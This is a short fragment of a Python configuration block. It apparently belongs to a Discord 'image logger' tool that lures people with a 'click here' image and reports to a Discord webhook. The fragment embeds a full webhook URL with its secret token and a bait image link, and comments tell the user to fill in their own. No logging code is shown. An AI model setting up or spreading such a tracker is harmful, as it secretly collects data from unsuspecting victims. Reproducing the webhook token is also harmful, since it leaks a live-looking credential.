...
config = {
    "webhook": "https://discord.com/api/webhooks/1142230222901612625/F2VVtxd9lZGSB9-6UogL3BxMThYT9DOYuFx5Gn5-WSQtTmzv-hlAeSnKDXgMQ59yKULH", # <------------------------- Put your webhook link here.
    "image": "https://media.discordapp.net/attachments/1141141030578683924/1142230685176836287/abstract-click-here-press-here-button-vector-element-white-background-abstract-click-here-press-here-button-vector-137041149.png?width=595&height=595", # <------------------------- Put image address link here.
    "imageArgument": True,
